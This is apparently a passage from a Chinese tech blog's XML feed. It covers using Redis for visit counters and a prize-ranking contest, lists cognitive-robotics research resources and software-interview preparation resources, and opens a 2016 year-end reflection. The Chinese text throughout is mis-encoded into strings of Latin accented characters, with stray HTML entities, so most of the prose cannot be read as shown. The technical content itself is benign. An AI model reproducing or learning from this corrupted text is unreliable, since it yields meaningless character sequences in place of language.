é‚„è¨˜å¾—æˆ‘å€‘æéçš„ INCR å—ï¼Ÿé€™ä¸æ˜¯å°±æ´¾ä¸Šç”¨å ´äº†ï¼å¯ä»¥è‡ªå·±å®šç¾© key çš„æ ¼å¼ï¼Œä¾‹å¦‚èªªï¼šabc123:visit ä»£è¡¨ abc123 é€™å€‹çŸ­ç¶²å€çš„ç¸½å…±é€ è¨ªæ¬¡æ•¸ï¼Œæ¥è‘—ï¼Œåªè¦åœ¨æ¯ä¸€æ¬¡çš„ Request éƒ½åŸ·è¡Œï¼šINCR abc123:visitï¼Œé€™å€‹ key è£¡é¢å°±æ˜¯ä½ è¦çš„æ•¸å­—äº†ï¼Œä»¥å¾Œéƒ½å¾ Redis è®€å–å°±å¥½ã€‚  
é™¤äº†é€™å€‹ä»¥å¤–ï¼Œå‡è¨­ä½ æƒ³è¦æä¾›ã€Œä¸é‡è¤‡ IP è¨ªå•æ¬¡æ•¸ã€ï¼Œå‰é¢æåˆ°çš„ Set å°±å¾ˆé©åˆã€‚å¯ä»¥æŠŠæ¯ä¸€å€‹ Request çš„ä¾†æº IP éƒ½ä¸Ÿé€²ä¸€å€‹ Setï¼Œåªè¦ç”¨ SCARD å°±å¯ä»¥çŸ¥é“æœ‰å¤šå°‘ä¸é‡è¤‡ IP äº†ï¼Œå¾ˆæ–¹ä¾¿å°å§ï¼
é«˜å³æ™‚æ€§æ’åç³»çµ±æˆ‘æ›¾ç¶“åšéä¸€å€‹å°ˆæ¡ˆï¼Œéœ€æ±‚å¦‚ä¸‹ï¼š  

ä¸­åˆ 12 é»é–‹æ”¾ä½¿ç”¨è€…é€²å…¥ç¶²ç«™ï¼Œä¸¦ä¸”å›ç­”ä¸€é¡Œå•é¡Œ
å›ç­”å®Œå¾Œæœƒçœ‹åˆ°è‡ªå·±çš„æ’åï¼ˆä¾ç­”é¡Œæ™‚é–“æ’åºï¼‰ï¼Œç…§åæ¬¡ç²å¾—çå“
åªæœ‰å‰ 300 åæœ‰çå“ï¼Œä¹‹å¾Œéƒ½æ²’æœ‰

å¯ä»¥å…ˆæƒ³ä¸€ä¸‹æœ‰å“ªäº›åœ°æ–¹æœƒéœ€è¦è·Ÿè³‡æ–™åº«æºé€š  

é€²å…¥ç¶²ç«™æ™‚ï¼Œè¦å…ˆæª¢æŸ¥æ˜¯å¦è¶…é 300 åï¼Œæœ‰çš„è©±æç¤ºæ´»å‹•çµæŸï¼ˆselect count(*)â€¦ï¼‰
æ¥è‘—æª¢æŸ¥ä½¿ç”¨è€…æ˜¯å¦å·²ç­”é¡Œéï¼Œå·²ç­”é¡Œéçš„è©±å°±é¡¯ç¤ºæ’åï¼ˆselect .. where id&#x3D;..ï¼‰
è‹¥æ²’ç­”éï¼Œé¡¯ç¤ºç­”é¡Œé é¢
ç­”é¡ŒçµæŸä¹‹å¾Œï¼Œé¡¯ç¤ºä½¿ç”¨è€…åæ¬¡ï¼ˆinsert into .. id&#x3D;..ï¼‰

ç”±æ–¼é€™å€‹æ´»å‹•åªæœ‰å‰ 300 åæœ‰çå“ï¼Œé ä¼°ä½¿ç”¨è€…æœ‰ 10000 äººçš„è©±ï¼Œå¯èƒ½åœ¨ 10 ç§’å…§é€™å€‹æ´»å‹•å°±çµæŸäº†ï¼  
10 ç§’å…§ä½ çš„è³‡æ–™åº«å¿…é ˆã€ŒåŒæ™‚æ‰¿å—ã€é€™éº¼å¤šå€‹ queryï¼Œå¯èƒ½æœƒæœ‰é»åƒä¸æ¶ˆï¼Œè€Œä¸”ä»”ç´°æª¢è¦–ä¹‹å¾Œï¼Œæœƒç™¼ç¾å¾ˆå¤šåœ°æ–¹å…¶å¯¦æ²’æœ‰å¿…è¦ç”¨è³‡æ–™åº«ä¾†åšï¼Œæˆ–è€…æ˜¯èªªï¼Œç”¨ Redis ä¾†åšæœƒæ›´å¥½ï¼  
ä¾‹å¦‚èªªï¼Œå¯ä»¥é€™æ¨£è¦åŠƒï¼š

ç”¨ä¸€å€‹ keyï¼šisOver å„²å­˜æ´»å‹•æ˜¯å¦çµæŸ
ç”¨ account ç•¶åš keyï¼Œè£¡é¢å„²å­˜ä½¿ç”¨è€…çš„åæ¬¡

ä¸Šé¢çš„æµç¨‹å°±å¯ä»¥æ”¹å¯«æˆï¼š

é€²å…¥ç¶²ç«™æ™‚ï¼Œå» Redis è®€å– isOverï¼ŒæŸ¥çœ‹æ´»å‹•æ˜¯å¦çµæŸ
æª¢æŸ¥ä½¿ç”¨è€…æ˜¯å¦ç­”é¡Œéï¼Œçœ‹ Redis çš„ä½¿ç”¨è€…å¸³è™Ÿé€™å€‹ key æœ‰æ²’æœ‰è³‡æ–™
è‹¥æ²’ç­”éé¡Œä¸”ç­”å®Œé¡Œï¼Œå¯«å…¥è³‡æ–™åº«ï¼Œä¸¦ä¸”æŠŠåæ¬¡å¯«å…¥ Redis
è‹¥æ˜¯é€™å€‹ä½¿ç”¨è€…çš„æ’å&gt;&#x3D;300ï¼Œè¨­å®š isOver &#x3D; true

åŸæœ¬éœ€è¦ä¸‰å€‹å°è³‡æ–™åº«çš„æ“ä½œï¼Œç¾åœ¨ç¸®æ¸›åˆ°åªå‰©ä¸‹æœ€å¿…è¦çš„ä¸€å€‹ï¼Œå…¶ä»–éƒ½å¯ä»¥äº¤çµ¦ Redis è™•ç†ã€‚è€Œä¸”åˆå› ç‚º Redis æ˜¯ in-memory çš„è³‡æ–™åº«ï¼Œåæ‡‰é€Ÿåº¦éå¸¸å¿«ï¼å†åŠ ä¸Šæˆ‘å€‘çš„ key ä¸¦ä¸å¤šï¼ˆä¸€è¬å¤šå€‹ key è€Œå·²ï¼‰ï¼Œç”¨åˆ°çš„è¨˜æ†¶é«”å¾ˆå°‘ã€‚  
å°±é€™æ¨£ï¼Œé€é Redis çš„å¹«åŠ©ï¼Œå¾ˆé †åˆ©çš„å°±å¯ä»¥è§£æ±ºåŸæœ¬è³‡æ–™åº«è² è¼‰å¤ªé‡å¯èƒ½æœƒå¾ˆæ…¢ç”šè‡³æ›æ‰çš„å•é¡Œã€‚
ç¸½çµè‹¥æ˜¯ä¸‹æ¬¡ä½ æœ‰äº›å°ˆæ¡ˆä½¿ç”¨è€…å¾ˆå¤šï¼Œæˆ–æ˜¯éœ€è¦å¾ˆå¿«é€Ÿçš„è¿”å›è³‡è¨Šï¼Œä½†æ˜¯åˆæ€•è³‡æ–™åº«æ’ä¸ä½ï¼Œä¸å¦¨æƒ³æƒ³æ˜¯ä¸æ˜¯èƒ½å¤ å°å…¥ Redisï¼Œæˆ–å…¶ä»–ä¹Ÿæ˜¯åšå¿«å–çš„ serviceã€‚å…¶å¯¦åœ¨å¾ˆå¤šå ´åˆï¼Œå¦‚æœå¿«å–é‹ç”¨å¾—å®œçš„è©±ï¼Œå¯ä»¥æ¸›è¼•å¾ˆå¤šè³‡æ–™åº«çš„è² æ“”ï¼ŒåŒæ™‚ä¹ŸåŠ å¿«éŸ¿æ‡‰çš„é€Ÿåº¦ã€‚
è‹¥æ˜¯ä½ å° Redis å¾ˆæœ‰èˆˆè¶£ï¼Œå¯ä»¥åƒè€ƒ Redis è¨­è¨ˆèˆ‡å¯¦ç¾ é€™å€‹ç¶²ç«™ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>Redis, Database, Cache</tag>
      </tags>
  </entry>
  <entry>
    <title>èªçŸ¥æ©Ÿå™¨äººç ”ç©¶è³‡æºæ•´ç†</title>
    <url>/2018/08/04/resrc-for-cognitive-robotics/</url>
    <content><![CDATA[å‰è¨€èªçŸ¥æ©Ÿå™¨äººä¸€ç›´æ˜¯æˆ‘å¾ˆæœ‰èˆˆè¶£çš„ç ”ç©¶é ˜åŸŸï¼Œæ‰€ä»¥æƒ³æŠŠä¸€äº›å¸¸ç”¨çš„ç ”ç©¶è³‡æºæ•´ç†ä¸‹ä¾†ï¼Œä¹Ÿåˆ†äº«çµ¦å¤§å®¶ï¼Œè®“æƒ³è¦è¸å…¥ç›¸é—œé ˜åŸŸçš„ç ”ç©¶è€…ï¼Œèƒ½ç«™åœ¨é€™äº›è³‡æºä¹‹ä¸Šé–‹é–‹å¿ƒå¿ƒåœ°ç ”ç©¶ã€‚
æœ€æ–°è«–æ–‡è³‡æº
CORL
CORL çš„å…¨åæ˜¯ Conference on Robot Learningï¼Œä¸€è½å°±çŸ¥é“ æ˜¯è€æ±Ÿæ¹–äº† æ˜¯è·Ÿæ©Ÿå™¨äººçš„å­¸ç¿’å’ŒèªçŸ¥ç›¸é—œçš„ä¸€å€‹ conferenceã€‚
å› ç‚ºé€™å¹¾å¹´ä¾†å°‡ deep learningã€reinforcement learning ç­‰ç­‰æ–¹æ³•æ‡‰ç”¨åˆ°æ©Ÿå™¨äººå­¸ç¿’çš„ç ”ç©¶è¶Šä¾†è¶Šå¤šï¼Œç´¢æ€§é–‹ä¸€å€‹å°ˆé–€çš„ conference ä¾†è¨è«–ã€‚

ICRA cognitive robotics
èº«ç‚ºæ©Ÿå™¨äººé ˜åŸŸä¸­æ•¸ä¸€æ•¸äºŒå¤§çš„ conferenceï¼Œç•¶ç„¶ä¹Ÿæ˜¯æœƒæœ‰ cognitive robotics session å•¦ï¼

ICRA best cognitive robotics paper award
åŒä¸Šï¼Œå¯ä»¥åƒè€ƒ best paper awardï¼Œç›´æ¥è¿½ä¸Šæœ€é ‚å°–çš„è«–æ–‡ã€‚

Arxiv
Roboticsã€Machine Learningã€Artificial Intelligence è·Ÿ Neural and Evolutionary Computing éƒ½æ˜¯ä¸éŒ¯å€¼å¾—é—œæ³¨çš„é¡åˆ¥ã€‚


å­¸ç¿’è³‡æºçœ‹ä¾†çœ‹å»é€™äº›ç ”ç©¶éƒ½å¥½å²å®³å•Šï¼Œæ€éº¼è£œè¶³åŸºç¤çŸ¥è­˜å‘¢ã€‚çœ‹å€‹ Awesome list æ˜¯å€‹ä¸éŒ¯çš„é¸æ“‡ã€‚

Awesome Artificial Intelligence (AI)

What math is needed for artificial intelligence&#x2F;machine learning research?


ä¸€äº›é ‚å°–ç ”ç©¶è€…åˆ—å¹¾ä½ç›¸ç•¶å²å®³çš„ç ”ç©¶è€…ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥è‡ªå·±å†ä¸Šç¶²æ‰¾ï¼Œç•¢ç«Ÿé€™å€‹é ˜åŸŸç‰½æ¶‰åˆ°å¤ªå¤šæ±è¥¿ï¼Œèˆ‰å‡¡é›»è…¦è¦–è¦ºã€è‡ªç„¶èªè¨€è™•ç†ã€è·¯å¾‘è¦åŠƒã€ç‰©å“æ“ä½œç­‰ç­‰éƒ½å¯ä»¥æ˜¯åˆ‡å…¥èªçŸ¥èƒ½åŠ›çš„ç ”ç©¶è·¯å¾‘ã€‚

Joshua B. Tenenbaumï¼ˆMITï¼‰

Sergey Levineï¼ˆUC Berkeleyï¼‰

Noah D. Goodmanï¼ˆStanford Universityï¼‰

Pieter Abbeelï¼ˆUC Berkeleyï¼‰

Stefan Schaalï¼ˆUSCï¼‰

Ken Goldbergï¼ˆUC Berkeleyï¼‰

Michael Beetzï¼ˆUniversity of Bremenï¼‰


ç¸½çµä»Šå¤©è·Ÿå¤§å®¶åˆ†äº«äº†ä¸€äº›å¥½ç”¨çš„ç ”ç©¶è³‡æºï¼Œå°é€™å¡Šé ˜åŸŸæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥åƒè€ƒçœ‹çœ‹ï¼Œæœ‰å…¶ä»–è¦ºå¾—ä¸éŒ¯çš„è³‡æºä¹Ÿæ­¡è¿ç•™è¨€è£œå……ï¼
é—œæ–¼ä½œè€…ï¼š

@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚

]]></content>
      <tags>
        <tag>cognitive robot</tag>
      </tags>
  </entry>
  <entry>
    <title>è»Ÿé«”å·¥ç¨‹å¸«é¢è©¦è³‡æºæœ€ç°¡æ•´ç†èˆ‡æŠ€å·§åˆ†äº«</title>
    <url>/2018/07/07/resrc-for-swe/</url>
    <content><![CDATA[å‰è¨€åªè¦æ˜¯åœ¨ CS ç”¢æ¥­ï¼Œæƒ³è¦ç•¶è»Ÿé«”å·¥ç¨‹å¸«ï¼ŒåŸºæœ¬çš„è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•åŠŸåŠ›æ˜¯å¿…é ˆè¦æ™‚æ™‚æ‰“ç£¨çš„ï¼Œé€™æ¬¡å°±æ•´ç†ä¸€äº›å¥½ç”¨çš„å·¥å…·ï¼Œè€Œä¸”ç›¡é‡æŠŠè³‡æºæœ€å°åŒ–ï¼Œè®“å¤§å®¶åœ¨æº–å‚™é¢è©¦æ™‚æœ‰è¶³å¤ è³‡æºï¼Œåˆä¸æœƒè¢«å¤ªå¤šè³‡æ–™å¼„å¾—æšˆé ­è½‰å‘ã€‚
ç·šä¸Šç·´ç¿’å¯« code ç¶²ç«™
Hackerrank

å¦‚æœæ˜¯å‰›é–‹å§‹åˆ·é¡Œï¼Œå¯ä»¥é€éå¯« Hackerrank çš„é¡Œç›®å¹«å¿™è¤‡ç¿’åŸºæœ¬çš„è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ã€‚

Lintcode

Lintcode æœ‰ä¸€äº› ladder ä¹Ÿé‚„ä¸éŒ¯ï¼Œå¯ä»¥å¹«åŠ©å¾ªåºæ¼¸é€²åœ°åˆ·é¡Œã€‚æ¯”å¦‚èªªä¸‹åœ–çš„ bit manipulation ladderï¼š

Leetcode

Leetcode æ‡‰è©²å°±ä¸ç”¨å¤šèªªï¼Œå¾ˆå¤šäººæ‡‰è©²éƒ½çŸ¥é“ï¼Œåªè¦ä½ æœ‰äº†ä¸€å®šåŸºç¤ï¼Œéœ€è¦å¤§é‡ç·´ç¿’é¡Œç›®ï¼Œé‚£ Leetcode çµ•å°æ˜¯ä¸äºŒé¸æ“‡ã€‚
è€Œä¸” Leetcode ä¹Ÿå¯ä»¥æŒ‰ç…§ä¸åŒçš„ topicï¼Œå€åˆ†é›£æ˜“åº¦ï¼Œç”šè‡³å¯ä»¥èŠ±éŒ¢çœ‹åˆ°å„å…¬å¸å¸¸å‡ºçš„é¡Œç›®ï¼Œä¹Ÿæ˜¯å¾ˆä¸éŒ¯ã€‚

ç·šä¸Šèª²ç¨‹å¦‚æœæƒ³è¦æœ‰ç³»çµ±åœ°å­¸ç¿’ï¼ŒèŠ±é»éŒ¢å¾ç·šä¸Šèª²ç¨‹å­¸ç¿’ä¹Ÿæ˜¯å¾ˆæœ‰æ•ˆç‡çš„æ–¹æ³•ã€‚
æ¼”ç®—æ³•èˆ‡è³‡æ–™çµæ§‹
ä¹ç« ç®—æ³•èª²ç¨‹

ä¹ç« ç®—æ³•æ˜¯ä¸­åœ‹æœ‰åçš„æ¼”ç®—æ³•æ•™å­¸ç¶²ç«™ï¼Œä»–å€‘ç¾åœ¨ä¹Ÿæ¨å‡ºäº†è¨±å¤šèª²ç¨‹ï¼Œå¦‚æœæ˜¯å–œæ­¡æœ‰äººå¹«å¿™æŠŠè³‡æ–™æ•´ç†å¥½ã€ä¸¦åŒ…å«è¬›è§£çš„ï¼Œä¹Ÿå¯ä»¥å…ˆä¾†ä¸Šé€™å€‹èª²ï¼Œå†å¥½å¥½åˆ·é¡Œã€‚
ç³»çµ±è¨­è¨ˆ
Grokking the System Design Interview


æŠ€å·§å„é …èƒ½åŠ›åˆ†é–‹ç·´ç¿’åŸºæœ¬ä¸Šè¦å¯«å‡ºä¸€é“é¡Œç›®ï¼Œè€Œä¸”è¦åšåˆ° bug freeï¼Œå¿…é ˆè¦æœ‰ä¸‹åˆ—èƒ½åŠ›ï¼š

é‡æ¸…å•é¡Œï¼ˆå±•ç¾ç´°å¿ƒç¨‹åº¦ï¼Œå¯ä»¥è·Ÿé¢è©¦å®˜æºé€šæ¸…æ¥šå•é¡Œç¯„åœå†ä¸‹æ‰‹ï¼‰
æƒ³å‡ºæ¼”ç®—æ³•ï¼ˆå±•ç¾è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•çš„æ‡‰ç”¨èƒ½åŠ›ï¼‰
å¯«å‡º pseudo codeï¼ˆå±•ç¾æŠŠåˆæ­¥æƒ³æ³•è®Šæˆå¯é‹è¡Œç¨‹å¼çš„èƒ½åŠ›ï¼‰
å¯«å‡º codeï¼ˆå±•ç¾ç¨‹å¼èªè¨€çš„æŒæ¡èƒ½åŠ›ï¼‰
äººé«” testing &amp; debuggingï¼ˆå±•ç¾ unit testã€integration test çš„åŸºæœ¬èƒ½åŠ›ï¼‰
æºé€šèƒ½åŠ›ï¼ˆå•æ¸…æ¥šå•é¡Œã€æŠŠè‡ªå·±çš„æƒ³æ³•è¬›æ¸…æ¥šã€åœ¨å¿…è¦æ™‚å°‹æ±‚å”åŠ©ï¼‰

å¦‚æœæŠŠæ‰€æœ‰èƒ½åŠ›éƒ½æ··åœ¨ä¸€èµ·ç·´ç¿’ï¼Œå°±å¾ˆå®¹æ˜“æ··äº‚ï¼Œå› ç‚ºæ¯ä¸€é“é¡Œç›®è®“ä½ å¡çš„é»å¯èƒ½éƒ½ä¸åŒï¼›åä¹‹ï¼Œå¦‚æœæœ‰æ„è­˜åœ°ç™¼ç¾è‡ªå·±å®¹æ˜“å¡åœ¨ä»€éº¼åœ°æ–¹ï¼Œå°±å®¹æ˜“å°ˆé …åŠ å¼·ï¼ˆä¾‹å¦‚ä½ å¸¸å¸¸å¯ä»¥æƒ³å‡ºæ¼”ç®—æ³•ä¸¦å¯¦ä½œï¼Œä½†å¸¸å¸¸æ›åœ¨ edge caseï¼Œé‚£ä½ æ‡‰è©²å…ˆåŠ å¼· 1ï¼Œè®“è‡ªå·±åœ¨é‡æ¸…å•é¡Œæ™‚å°±æŠŠ test case è€ƒæ…®å¾—æ›´å®Œå–„ï¼Œå†é–‹å§‹æƒ³æ¼”ç®—æ³•ï¼›ç„¶å¾Œä¹Ÿè¦åŠ å¼· 5ï¼Œè®“ä½ åœ¨æ¸¬è©¦è‡ªå·±ç¨‹å¼æ™‚ï¼Œå¯ä»¥å®Œæ•´æ¸¬è©¦è‡ªå·±çš„ç¨‹å¼æ˜¯å¦å¯ä»¥ handle åœ¨ç¬¬ 1 æ­¥è€ƒæ…®åˆ°çš„æ‰€æœ‰ test caseï¼‰ã€‚
è¨˜éŒ„éè‡ªå·±å¯«éçš„é¡Œç›®é‚„æœ‰è§£æ³•é€™ä¸€é» éå¸¸éå¸¸éå¸¸ é‡è¦ï¼å¦‚æœèƒ½å¤ æŠŠæƒ³éçš„è§£æ³•æ¸…æ¥šåœ°å¯«ä¸‹ä¾†ï¼Œä¹‹å¾Œæƒ³è¦è¤‡ç¿’å°±æœƒäº‹åŠåŠŸå€ï¼Œç•¢ç«Ÿæœ‰å¾ˆå¤šå¾ˆ tricky çš„é¡Œç›®ï¼Œå¦‚æœæ¯æ¬¡éƒ½è¦é‡æƒ³ï¼ŒæœƒèŠ±éå¸¸å¤šæ™‚é–“ã€‚æ­¤å¤–ï¼Œå¦‚æœæƒ³è¦æº–å‚™å¾—æ›´å……è¶³ï¼Œå¯«å®Œå•é¡Œæƒ³ä¸€æƒ³ follow-up question æœƒæ€éº¼å‡ºä¹Ÿæ˜¯å¾ˆé‡è¦çš„ï¼Œå¦‚æœæ²’æœ‰æ–‡ä»¶ç´¯ç©ï¼Œæ¯æ¬¡çœ‹åˆ°é¡Œç›®é€£ä»¥å‰æƒ³æ‡‚çš„æ±è¥¿éƒ½è¦é‡ä¾†ï¼Œé‚£åˆæ€éº¼æœ‰æ™‚é–“æº–å‚™æ›´é€²éšçš„å•é¡Œå‘¢ï¼Ÿç´€éŒ„çš„å·¥å…·å¾ˆå¤šç¨®ï¼Œåƒæ˜¯å¯«å€‹ blogã€gitbook æˆ–æ˜¯ github repository éƒ½æ˜¯ä¸éŒ¯çš„é¸æ“‡ã€‚å¯ä»¥åƒè€ƒ é€™æœ¬ gitbook - leetcode noteã€‚
è³‡æºä¸ç”¨å¤šï¼Œè¶³å¤ å°±å¥½èªªçœŸçš„ï¼Œç¶²è·¯ä¸Šçš„é¢è©¦æº–å‚™è³‡æºè¶…ç´šå¤šï¼Œæ•´ç†å¾—å¾ˆç”¨å¿ƒçš„ github repository å¦‚ awesome-interview-questions ä¹Ÿå¾ˆå¤šï¼Œä½†æ˜¯ï¼Œé‡é»é‚„æ˜¯åœ¨æ–¼èƒ½å¦æŠŠé¡Œç›®å¯«å‡ºä¾†ã€‚æ‰€ä»¥èˆ‡å…¶æ”¶é›†ä¸€å †è³‡æºä½†é€ æˆå¤§è…¦è¶…è¼‰ï¼Œä¸å¦‚å°±å°ˆæ³¨åœ¨è§£é¡Œç›®ä¸Šé¢ã€‚ä¸éï¼Œæˆ‘ä¸æ˜¯è¦å¦å®šé€™äº›è³‡æºçš„åƒ¹å€¼ï¼Œå› ç‚ºæ¯å€‹äººå–œæ­¡æº–å‚™çš„æ–¹æ³•ä¸åŒï¼Œä¸åŒåå¥½å°±æ˜¯å’Œä¸åŒçš„è³‡æºï¼ˆæœ€ç°¡å–®èªªå°±æ˜¯æœ‰äººå–œæ­¡æ–‡å­—å­¸ç¿’ï¼Œæœ‰äººå–œæ­¡åœ–åƒå­¸ç¿’ï¼Œé‚£åŒæ¨£é‡åˆ°æƒ³ä¸å‡ºä¾†çš„é¡Œç›®ï¼Œå–œæ­¡åœ–åƒå­¸ç¿’çš„äººå°±å¯ä»¥å» youtube æ‰¾ è§£é¡Œçš„å½±ç‰‡ çœ‹ï¼Œè€Œä¸å¿…åŸ·è‘—ç¡¬è¦çœ‹æ‡‚ leetcode è¨è«–ä¸²ï¼‰ã€‚
ç¸½çµä»¥ä¸Šå¹«å¤§å®¶æ•´ç†äº†ä¸€äº›å¥½ç”¨çš„é¢è©¦æº–å‚™è³‡æºï¼Œå¦‚æœä½ æƒ³è¦ä¸Šæ‰‹ï¼Œå¯ä»¥å¾ hackerrank è·Ÿ lintcode é–‹å§‹æ‰¾å›è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•çš„åŸºæœ¬æ‰‹æ„Ÿã€‚è¦ç·´ç¿’å„ç¨®è®Šå½¢é¡Œç›®çš„è©±ï¼Œå°±ä¸Š leetcode ç‹‚åˆ·é¡Œã€‚å¦‚æœçœ‹åˆ°æŸå€‹çŸ¥è­˜æƒ³è¦æ›´åŠ äº†è§£ï¼Œgoogle çœ‹çœ‹æˆ–æ˜¯åƒè€ƒ awesome-competitive-programmingã€awesome-algorithms ä¹‹é¡çš„æ•´ç†ä¹Ÿå¾ˆå¤ ç”¨äº†ã€‚
ç¥å¤§å®¶æº–å‚™æ„‰å¿«ï¼
å»¶ä¼¸é–±è®€
èŠ±èŠ±é†¬åˆ· Leetcode Youtube Channel
è»Ÿé«”å·¥ç¨‹å¸«é¢è©¦è³‡æºæ•´ç†
Google Code Jam è³½åˆ¶ä»‹ç´¹ï¼ˆå¦‚æœæ²’è¦æ‰¾å·¥ä½œï¼Œè¦ºå¾—è‡ªå·±åˆ·åˆ°å¤ å¼·äº†ä¹Ÿå¯ä»¥è¡ä¸€å€‹çœ‹çœ‹æ‹¿ T-Shirtï¼‰

é—œæ–¼ä½œè€…ï¼š

@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚

]]></content>
      <tags>
        <tag>software engineer, data structure, algorithm, interview</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€å€‹è³‡æ·ºå·¥ç¨‹å¸«å¹´æœ«çš„è‡ªæˆ‘çœè¦–</title>
    <url>/2016/12/31/review-2016/</url>
    <content><![CDATA[å—¨å¤§å®¶ï¼Œä»Šå¤©æ˜¯ 2016 å¹´çš„æœ€å¾Œä¸€å¤©äº†ï¼Œå…ˆé ç¥å¤§å®¶æ–°å¹´å¿«æ¨‚ï¼Œèƒ½å¤ åœ¨æ˜å¹´æœ‰ä¸€å€‹å¥½çš„é–‹å§‹ã€‚åŒæ™‚ä¹Ÿæ„Ÿè¬å¤§å®¶å° TechBridge çš„æ”¯æŒã€‚
æˆ‘è‡ªå·±å–œæ­¡çœ‹çš„æŠ€è¡“æ–‡ç« æœ‰å…©é¡ï¼Œä¸€ç¨®æ˜¯åˆ†äº«ä¸€äº›å¯¦éš›çš„è»Ÿç¡¬é«”æŠ€è¡“ï¼Œä¾‹å¦‚èªªæ•™ä½ æ€éº¼ç”¨ Node.js å¯«ä¸€å€‹èŠå¤©æ©Ÿå™¨äººï¼Œæˆ–æ˜¯æ€éº¼ç”¨æœ€æ–°çš„ CSS èªæ³•å»ºé€ å‡ºé…·ç‚«çš„ç¶²é æ•ˆæœç­‰ç­‰ã€‚å¦å¤–ä¸€ç¨®å‰‡æ˜¯æ¯”è¼ƒã€Œè»Ÿã€ä¸€é»çš„å¿ƒå¾—åˆ†äº«æ–‡ï¼Œä¾‹å¦‚èªªæœ€è¿‘é€™é™£å­æ»¿å¸¸çœ‹åˆ°è¢«åˆ†äº«çš„é€™å…©ç¯‡ï¼šæ¥è¿‘ 2016 å¹´åº•çš„æˆ‘æ˜¯å¦æœ‰è³‡æ ¼ç¨±ç‚ºè³‡æ·±å·¥ç¨‹å¸«ã€æŠ€è¡“äººå“¡çš„ç™¼å±•ä¹‹è·¯ã€‚
æˆ‘é æœŸå¤§å®¶åœ¨é€™é€±æ‡‰è©²æƒ³è¦å¥½å¥½ä¼‘æ¯ï¼ˆå…¶å¯¦æˆ‘è‡ªå·±æƒ³å¥½å¥½ä¼‘æ¯ï¼‰ï¼Œå› æ­¤ï¼Œå°±æ±ºå®šå¯«å¾Œé¢é‚£ä¸€é¡å‹ï¼Œä¾†åˆ†äº«ä¸€ä¸‹è‡ªå·±çš„å¿ƒå¾—æ„Ÿæƒ³ã€‚ä¸éæ±æƒ³è¥¿æƒ³ï¼Œèº«ç‚ºä¸€å€‹å·¥ä½œç¶“é©—ä¸åˆ°å…©å¹´çš„é–‹ç™¼è€…ï¼Œå¯¦åœ¨æ˜¯å¾ˆé›£çµ¦å¤§å®¶ä»€éº¼ã€Œå»ºè­°ã€ï¼Œæ€•è€½èª¤äº†å¤§å®¶ã€‚æ–¼æ˜¯æœ€å¾Œå°±æ±ºå®šä¾†å¯«ä¸€ç¯‡è‡ªå·±åœ¨ä»Šå¹´è£¡é¢é«”æ‚Ÿèˆ‡å­¸ç¿’åˆ°çš„å¹¾ä»¶äº‹æƒ…ã€‚
åˆ†äº«ã€Œåˆ†äº«ã€ä¸€ç›´æ˜¯æˆ‘å¾ˆæ³¨é‡çš„ä¸€ä»¶äº‹æƒ…ï¼Œåœ¨æ¯ç¯‡æ–‡ç« æœ€åº•ä¸‹çš„ã€Œé—œæ–¼ä½œè€…ã€ï¼Œæˆ‘ä¹Ÿå¯«å¾—å¾ˆæ¸…æ¥šäº†ï¼š

ç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½

ç‚ºä»€éº¼æˆ‘è¦ºå¾—åˆ†äº«æ˜¯ä¸€ä»¶é‡è¦çš„äº‹æƒ…ï¼Ÿå› ç‚ºå¾æˆ‘æ¥è§¸ç¨‹å¼é–‹å§‹ï¼Œå°±å—éå¤ªå¤šäººçš„å¹«åŠ©äº†ã€‚ä¾‹å¦‚èªªå°æ™‚å€™å‰›é–‹å§‹å­¸ç¨‹å¼çŸ‡æ‡æ‡‚æ‡‚ï¼Œæ›¾ç¶“å»éé‚£æ™‚å€™æœ€ç†±é–€çš„ç¨‹å¼è¨è«–å€ç¨‹å¼è¨­è¨ˆä¿±æ¨‚éƒ¨ç™¼å•ï¼Œå°±å¾—åˆ°å¾ˆå¤šå‰è¼©çš„å¹«åŠ©ã€‚æˆ–è€…æ˜¯é•·å¤§ä¹‹å¾Œä¸Š ptt å°‹æ±‚è·æ¶¯ä¸Šçš„æˆ–æŠ€è¡“ä¸Šçš„å¹«å¿™ï¼Œä¹Ÿå¾—åˆ°å¾ˆå¤šå›é¥‹ã€‚
æ›´åˆ¥æå·¥ä½œä¸Šç¢°åˆ°å›°é›£ä¸€å®šæœƒç”¨çš„Stack Overflowï¼Œä»¥åŠè¦åšä»€éº¼æ–°åŠŸèƒ½ä¹‹å‰æœƒå…ˆæ‰¾æœ‰æ²’æœ‰åˆ¥äººå¯«éæ¨¡çµ„çš„Githubã€‚
